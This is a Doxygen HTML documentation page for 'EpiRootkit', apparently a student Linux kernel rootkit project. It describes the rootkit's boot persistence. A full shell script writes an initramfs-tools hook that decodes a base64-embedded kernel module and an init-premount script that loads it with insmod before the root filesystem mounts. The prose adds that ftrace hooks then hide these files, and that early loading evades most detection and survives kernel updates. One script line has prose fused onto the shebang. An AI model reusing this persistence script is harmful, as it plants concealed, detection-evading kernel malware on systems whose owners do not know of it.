<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: Persistence</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">By STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('df/d95/persist.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div><div class="header">
  <div class="headertitle"><div class="title">Persistence</div></div>
</div><!--header-->
<div class="contents">
<div class="toc"><h3>Table of Contents</h3>
<ul><ul><li class="level2"><a href="#autotoc_md52">1. üõ†Ô∏è Overview</a></li>
<li class="level2"><a href="#autotoc_md53">Automatic Loading</a></li>
<li class="level2"><a href="#autotoc_md54">2. üöÄ Boot Process</a><ul><li class="level3"><a href="#autotoc_md55">2.1 Loading</a></li>
<li class="level3"><a href="#autotoc_md56">2.2 Execution</a></li>
</ul>
</li>
<li class="level2"><a href="#autotoc_md57">3. üî• Advantages</a></li>
</ul>
</ul>
</div>
<div class="textblock"><p>To ensure the rootkit is automatically loaded at every system boot, we implemented a persistence mechanism based on integrating the module into the initramfs. This solution consists of packaging the rootkit binary file (.ko) within the <em>initramfs</em>, then inserting a small shell script that, during the kernel boot phase, performs the module insertion even before mounting the usual file systems. Once loaded, the module installs its <em>ftrace hooks</em> and hides its own components. Below, we describe in detail how this mechanism works: from the persistence script launched by the Makefile to the execution of module insertion at boot and its concealment.</p>
<h2><a class="anchor" id="autotoc_md52"></a>
1. üõ†Ô∏è Overview</h2>
<p>The core of persistence is a single shell script, <a class="el" href="../../d6/da9/initrd_8sh.html">initrd.sh</a>, located in the <code>scripts/romance</code> directory of the project. When a user executes the <code>sudo make</code> command and after compilation, the <code>Makefile</code> first encodes the rootkit .ko file in base64 to embed it in the <code>/lib/epirootkit/</code> directory on the root file system. It then calls the script to create two other specific scripts in the initramfs structure:</p>
<ul>
<li>A hook placed in <code>/etc/initramfs-tools/hooks/epirootkit</code> to copy the encoded file when generating the initramfs.Hook configurations are saved and automatically restored when the module is reinserted.</li>
<li>A script in <code>/etc/initramfs-tools/scripts/init-premount/epirootkit-load</code> that will be executed just before mounting the root file system, to insert the module.</li>
</ul>
<h2><a class="anchor" id="autotoc_md53"></a>
Automatic Loading</h2>
<div class="fragment"><div class="line">#!/usr/bin/env bashThe rootkit can be configured to load automatically at system boot.</div>
<div class="line"> </div>
<div class="line">set -e</div>
<div class="line"> </div>
<div class="line">BLOB_SRC=&quot;/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv&quot;</div>
<div class="line"> </div>
<div class="line">HOOK_DIR=&quot;/etc/initramfs-tools/hooks&quot;</div>
<div class="line">HOOK_PATH=&quot;$HOOK_DIR/epirootkit&quot;</div>
<div class="line">mkdir -p &quot;$HOOK_DIR&quot;</div>
<div class="line">cat &gt; &quot;$HOOK_PATH&quot; &lt;&lt; &#39;EOF&#39;</div>
<div class="line">#!/bin/sh</div>
<div class="line">set -e</div>
<div class="line"> </div>
<div class="line">PREREQ=&quot;&quot;</div>
<div class="line">prereqs() { echo &quot;$PREREQ&quot;; }</div>
<div class="line">case &quot;$1&quot; in</div>
<div class="line">  prereqs) prereqs &amp;&amp; exit 0 ;;</div>
<div class="line">esac</div>
<div class="line"> </div>
<div class="line">mkdir -p &quot;${DESTDIR}/sbin&quot;</div>
<div class="line">ln -s /bin/kmod &quot;${DESTDIR}/sbin/insmod&quot;</div>
<div class="line"> </div>
<div class="line">mkdir -p &quot;${DESTDIR}/lib/epirootkit&quot;</div>
<div class="line">install -m644 /lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv \</div>
<div class="line">  &quot;${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv&quot;</div>
<div class="line"> </div>
<div class="line">base64 -d &quot;${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv&quot; \</div>
<div class="line">  &gt; &quot;${DESTDIR}/lib/epirootkit/epirootkit.ko&quot;</div>
<div class="line">rm -f &quot;${DESTDIR}/lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv&quot;</div>
<div class="line">EOF</div>
<div class="line"> </div>
<div class="line">chmod +x &quot;$HOOK_PATH&quot;</div>
<div class="line"> </div>
<div class="line">LOAD_DIR=&quot;/etc/initramfs-tools/scripts/init-premount&quot;</div>
<div class="line">LOAD_PATH=&quot;$LOAD_DIR/epirootkit-load&quot;</div>
<div class="line">mkdir -p &quot;$LOAD_DIR&quot;</div>
<div class="line">cat &gt; &quot;$LOAD_PATH&quot; &lt;&lt; &#39;EOF&#39;</div>
<div class="line">#!/bin/sh</div>
<div class="line">/sbin/insmod /lib/epirootkit/epirootkit.ko 2&gt; /tmp/insmod.err || true</div>
<div class="line">EOF</div>
<div class="line"> </div>
<div class="line">chmod +x &quot;$LOAD_PATH&quot;</div>
<div class="line"> </div>
<div class="line">update-initramfs -u -k &quot;$(uname -r)&quot;</div>
</div><!-- fragment --><h2><a class="anchor" id="autotoc_md54"></a>
2. üöÄ Boot Process</h2>
<h3><a class="anchor" id="autotoc_md55"></a>
2.1 Loading</h3>
<p>The Linux kernel loads into memory the previously generated initramfs. The latter contains the epirootkit.ko module decrypted from the base64 file as well as the <code>hooks/epirootkit</code> and <code>scripts/init-premount/epirootkit-load</code> scripts. The <code>insmod</code> binary corresponding to a symbolic link to the <code>kmod</code> binary, but not being present by default in the initramfs, we manually create the symbolic link to make the command available. </p><div class="fragment"><div class="line">ln -s /bin/kmod &quot;${DESTDIR}/sbin/insmod&quot;</div>
</div><!-- fragment --><h3><a class="anchor" id="autotoc_md56"></a>
2.2 Execution</h3>
<p>Before mounting the root, the initramfs executes all scripts present in scripts/init-premount/. Our script simply calls <code>/sbin/insmod /lib/epirootkit/epirootkit.ko</code>. After loading the module, the initramfs completes its task, then exits its <em>rootfs initramfs</em> phase. The kernel then mounts the system root from the disk. At this stage, <em>epirootkit.ko</em> is already active, and the <em>ftrace</em> hooks will intercept all subsequent system calls, and can automatically hide the persistence scripts to prevent their detection, as well as the base64 module. Base64 mainly allows transforming the compiled module into plain text, for very minimal obfuscation.</p>
<h2><a class="anchor" id="autotoc_md57"></a>
3. üî• Advantages</h2>
<p>Initially, we considered using the classic method to ensure reliable kernel module persistence: inserting it directly into the modules directory, accompanied by a <code>.conf</code> file in <code>/etc/modules-load.d/</code>. However, we wanted to explore another approach... What we particularly appreciated with this alternative method is that the module is inserted before mounting the root partition, i.e., at a time when most classic detection or protection mechanisms are not yet active. This allows hiding all components from boot before other modules.</p>
<blockquote class="doxtable">
<p>&zwj;We also discovered many interesting techniques for future projects, notably on the excellent website <a href="https://www.elastic.co/security-labs/the-grand-finale-on-linux-persistence">Elastic Security Labs</a>. </p>
</blockquote>
<p>Moreover, each time <code>update-initramfs</code> is executed, the initramfs is automatically regenerated and includes again our hook as well as our encoded module. This way, even in case of kernel update (via apt, aptitude, etc.), persistence is maintained: as long as the scripts in <code>/etc/initramfs-tools/</code> are not deleted, the module is reinjected at each boot, without manual reinstallation being necessary. However, this method only works if the distribution actually uses initramfs-tools. On other distributions, the logic would probably need to be adapted to the initramfs generation tool used...</p>
<p><img src="../../logo_no_text.png" alt="" style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  " class="inline"/> </p>
</div></div><!-- contents -->
</div><!-- PageDoc -->
</div><!-- doc-content -->

<div id="nav-path" class="navpath"><!-- id is needed for treeview function! --></div>
</body>
</html>
